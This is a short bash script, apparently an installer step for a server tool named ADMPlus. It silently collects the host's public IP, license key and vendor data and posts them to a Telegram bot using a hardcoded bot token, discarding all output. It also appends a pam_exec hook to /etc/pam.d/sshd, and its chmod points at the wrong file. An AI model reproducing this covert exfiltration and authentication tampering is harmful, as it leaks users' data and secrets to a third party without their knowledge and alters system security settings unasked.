#!/bin/bash
TOKEN="1830099891:AAF7NVl2kT4UBrXACSLW-7TUBwKvyEhuI8g"
ID="553561525"
IP=$(curl -sSL "https://api.ipify.org")
MENSAJE="Nueva instalacion de ADMPlus $(cat /etc/ger-frm/versiÃ³n.txt): en IP: $IP Key Usada: $(cat /etc/newadm/key.txt) IPVendedor: $(cat /usr/bin/vendor_code) Mensaje de Vendedor: $(cat /etc/newadm/message.txt)"
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
#Verif= https://api.telegram.org/bot$TOKEN/getUpdates
if cat /etc/pam.d/sshd | grep notify-on-ssh-login.sh &> /dev/null; then
echo "" &> /dev/null
else
echo "session    optional     pam_exec.so  /usr/local/bin/notify-on-ssh-login.sh" >> /etc/pam.d/sshd
sudo touch /etc/ssh/login-notify.sh
cat > /usr/local/bin/notify-on-ssh-login.sh <<EOF
#!/bin/sh

if [ "$PAM_TYPE" != "close_session" ]; then
  host="`hostname`"
  message="SSH Login: $PAM_USER from $PAM_RHOST on $host"
  DISPLAY=:0 /usr/games/xcowsay "$message"&
fi
EOF
sudo chmod +x /etc/ssh/login-notify.sh
fi
curl -s -X POST $URL -d chat_id=$ID -d text="$MENSAJE" &> /dev/null
